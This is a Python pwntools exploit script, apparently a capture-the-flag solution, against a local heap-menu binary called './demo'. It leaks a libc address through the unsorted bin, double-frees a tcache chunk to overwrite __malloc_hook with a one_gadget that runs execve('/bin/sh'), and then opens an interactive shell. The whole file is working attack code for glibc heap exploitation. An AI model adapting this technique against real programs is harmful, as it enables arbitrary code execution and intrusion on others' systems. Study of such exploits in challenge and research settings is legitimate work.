#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"

def add(length, name):
    io.sendlineafter("choice : ", "1")
    io.sendlineafter("name :", str(length))
    io.sendafter("flower :", name)
    io.sendlineafter("flower :", "color")

def show():
    io.sendlineafter("choice : ", "2")

def delete(idx):
    io.sendlineafter("choice : ", "3")
    io.sendlineafter("garden:", str(idx))

def clean():
    io.sendlineafter("choice : ", "4")

def DEBUG():
    base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
    info("one_gadget -> {:#x}".format(one_gadget))
    info("visit -> {:#x}".format(base + 0xFC5))
    info("free -> {:#x}".format(base + 0xE88))
    info("malloc -> {:#x}".format(base + 0xC9E))
    info("read name -> {:#x}".format(base + 0xCE6))
    raw_input("DEBUG :")

if __name__ == "__main__":
    io = process("./demo", env = {"LD_PRELOAD": "./libc.so.6"})
    libc = ELF("./libc.so.6")

    for i in xrange(9):
        add(0x200, "aaaaaaaa")
    for i in xrange(8):
        delete(i) # 7 tcache bins, 1 unsorted bin
    #  DEBUG()
    for i in xrange(7):
        add(0x200, "bbbbbbbb") # tcache bins
    add(0x80, 'cccccccc') # unsorted bin, but why?
    show()
    libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\x00')) - 88 - 0x3dac20
    '''
    0xfccde execve("/bin/sh", rsp+0x40, environ)
    constraints:
          [rsp+0x40] == NULL
    '''
    one_gadget = libc.address + 0xfccde
    success("libc -> {:#x}".format(libc.address))

    add(0x200, 'dddddddd') # tcache bin attack
    show()
    delete(17)
    delete(17)

    add(0x200, p64(libc.sym[u'__malloc_hook'] - 0x10))
    add(0x200, p64(libc.sym[u'__malloc_hook'] - 0x10))
    #  DEBUG()
    add(0x200, '\0' * 0x8 + p64(one_gadget) + p64(libc.sym['__libc_realloc'] + 14))

    io.sendlineafter("choice : ", "1")

    io.interactive()
